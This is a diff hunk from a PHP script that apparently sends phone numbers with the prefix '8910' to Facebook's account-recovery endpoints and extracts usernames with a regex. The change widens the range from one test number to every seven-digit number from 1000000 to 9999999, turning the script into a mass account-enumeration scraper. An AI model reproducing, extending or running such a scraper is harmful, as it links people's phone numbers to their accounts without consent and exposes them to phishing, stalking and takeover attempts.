@@ -39,8 +39,8 @@ $telephone_prefix='8910';
 $url1="https://www.facebook.com/ajax/login/help/identify.php?ctx=recover";
 $url2="https://www.facebook.com/recover/initiate";
 $pattern = '/fcb[^<]+/'; // паттерн для отыскания имени пользователя
-$start_number=2433373;
-$end_number=2433374;
+$start_number=1000000;
+$end_number=9999999;
 ///////// Program
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_POST, 1);
